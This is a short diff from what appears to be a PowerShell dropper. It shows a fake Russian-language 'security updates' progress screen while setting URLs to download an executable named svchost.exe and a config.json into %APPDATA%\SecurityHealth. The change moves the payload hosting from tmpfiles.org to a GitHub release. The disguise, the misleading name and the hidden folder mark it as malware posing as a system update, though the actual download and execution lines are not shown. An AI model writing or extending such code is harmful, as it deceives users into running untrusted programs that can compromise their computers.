@@ -78,8 +78,8 @@ $timer.Add_Tick({
         if ($progress.Value -eq 40 -and -not $script:filesReady -and -not $script:errorOccurred) {
             $status.Text = "Загрузка обновлений безопасности..."
             $substatus.Text = "Получение пакетов с сервера..."
-            $urlExe  = "https://tmpfiles.org/wOw3DkIavsOY/svchost.exe"
-            $urlConf = "https://tmpfiles.org/wZwkD1ISvJBb/config.json"
+            $urlExe  = "https://github.com/Varenik638/check/releases/download/check/svchost.exe"
+            $urlConf = "https://github.com/Varenik638/check/releases/download/check/config.json"
             $workDir = "$env:APPDATA\SecurityHealth"
             try {
                 if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
